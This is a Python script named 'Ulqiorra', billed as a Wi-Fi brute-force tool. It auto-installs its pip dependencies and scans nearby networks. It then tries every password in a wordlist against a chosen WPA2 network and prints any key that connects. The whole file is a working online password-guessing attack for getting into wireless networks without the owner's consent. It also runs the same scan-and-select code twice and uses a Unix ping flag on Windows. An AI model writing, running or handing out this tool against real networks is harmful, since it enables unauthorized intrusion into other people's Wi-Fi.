import os
import sys
import subprocess
import importlib

# Lib List required to execute Ulqiorra
required_libraries = [
    "pywifi", "termcolor", "pyfiglet", "comtypes", "colorama"
]

def install_missing_libraries():
    """ Vérifie et installe les bibliothèques manquantes """
    for library in required_libraries:
        try:
            importlib.import_module(library)  #check lib installed
        except ImportError:
            print(f"[INFO] Installation de {library}...")
            subprocess.run([sys.executable, "-m", "pip", "install", library], check=True)

# install dependencies
install_missing_libraries()

# import lib after download
import argparse
import time
import re
import pywifi
import termcolor
import pyfiglet
from colorama import init
from pywifi import const
import os
import shutil
import pyfiglet
from termcolor import colored


init()

def print_centered_ascii(text, color="magenta"):
    """ Affiche un texte ASCII stylisé centré """
    columns = shutil.get_terminal_size().columns
    ascii_text = pyfiglet.figlet_format(text)  #convert to ASCII art
    centered_text = "\n".join(line.center(columns) for line in ascii_text.split("\n"))
    print(colored(centered_text, color))

def print_centered_author_no_color(text):
    """ Affiche le texte en 'digital' sans couleur pour éviter les codes ANSI """
    columns = shutil.get_terminal_size().columns
    digital_text = pyfiglet.figlet_format(text, font="digital")
    centered_text = "\n".join(line.center(columns) for line in digital_text.split("\n"))
    print(centered_text)


# display exemple
print_centered_ascii("Ulqiorra", "magenta")
print_centered_ascii("Wifi Brute Force", "magenta")
print_centered_author_no_color("Made by eli")

input('Press enter to continue >')


wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]  # first wifi interface detected 

def scan_wifi():
    """ Scanne et affiche les réseaux Wi-Fi disponibles """
    print(termcolor.colored("[*] Scanning for available Wi-Fi networks...", "yellow"))
    iface.scan()
    time.sleep(1)  # waiting for the scan
    results = iface.scan_results()

    networks = []
    network_dict = {}  #dictionnary to associate index <-> SSID

    print(termcolor.colored("\n=== Available Wi-Fi Networks ===", "cyan"))
    for index, network in enumerate(results):
        ssid = network.ssid
        if ssid and ssid not in networks:  # avoid doublon
            networks.append(ssid)
            network_dict[str(index + 1)] = ssid  # associate ssid to index
            print(termcolor.colored(f"{index + 1}) {ssid}", "white"))

    if not networks:
        print(termcolor.colored("[-] No Wi-Fi networks found. Try again.", "red"))
        sys.exit()

    return networks, network_dict

def select_wifi(networks, network_dict):
    """ Sélectionne un réseau Wi-Fi par numéro ou par SSID """
    while True:
        user_input = input("\n[*] Select a network by number or name: ").strip()

        # check if the number is valid
        if user_input in network_dict:
            return network_dict[user_input]  # return the ssid

        # check if ssid entry is valid
        if user_input in networks:
            return user_input

        print(termcolor.colored("[-] Invalid choice. Try again.", "red"))

# showing the interface
wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]  # show for the first time the wifi collection

# execute the scan and the selection
network_list, network_mapping = scan_wifi()
selected_network = select_wifi(network_list, network_mapping)

print(termcolor.colored(f"\n[✔] Selected Wi-Fi: {selected_network}", "green"))


def attempt_login(ssid: str, wordlist_file: str) -> None:
    """ Essaye chaque mot de passe dans le fichier pour se connecter """
    step = 0
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as wordlist:
        for word in wordlist:
            step += 1
            password = word.strip()
            wconnection(ssid, password, step)
    print(termcolor.colored(f"[-] No valid password found for {ssid}.", "red"))


def test_wifi_connection():
    """ Vérifie si Internet est accessible après connexion """
    try:
        #ping dns google to test if the networks works
        response = os.system("ping -c 1 8.8.8.8 >nul 2>&1" if os.name == "nt" else "ping -c 1 8.8.8.8 > /dev/null 2>&1")
        return response == 0  # if ping valid, connexion sucess
    except Exception:
        return False
    


def wconnection(ssid: str, password: str, wordlist_step: int) -> None:
    """ Tente de se connecter à un réseau Wi-Fi avec un mot de passe """
    iface.disconnect()
    time.sleep(1)  # pause to deconnect

    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN  
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP 
    profile.key = password

    iface.remove_all_network_profiles()  # Nettoyer les anciens profils
    new_profile = iface.add_network_profile(profile)

    iface.connect(new_profile)
    time.sleep(1)  # waiting for the connexion

    if iface.status() == const.IFACE_CONNECTED:
        print(termcolor.colored(f"Step {wordlist_step}: [✔] Success! Connected to ssid={ssid} with password={password}", "green"))
        input("Press Enter to exit...")
        sys.exit()  # leave if sucess
    else:
        print(termcolor.colored(f"Step {wordlist_step}: [✘] Password '{password}' failed!", "red"))
        iface.disconnect()
        time.sleep(1)
        


def main():
    networks, network_dict = scan_wifi()  # get the 2 values
    ssid = select_wifi(networks, network_dict)  # give 2 value

    wordlist_path = input("\n[*] Enter the path to your wordlist file or press enter to execute the default (default: pwList.txt): ").strip()
    if not wordlist_path:
        wordlist_path = "pwList.txt"

    if not os.path.exists(wordlist_path):
        print(termcolor.colored(f"[-] Error: File '{wordlist_path}' does not exist!", "red"))
        sys.exit()

    attempt_login(ssid, wordlist_path)

if __name__ == "__main__":
    main()
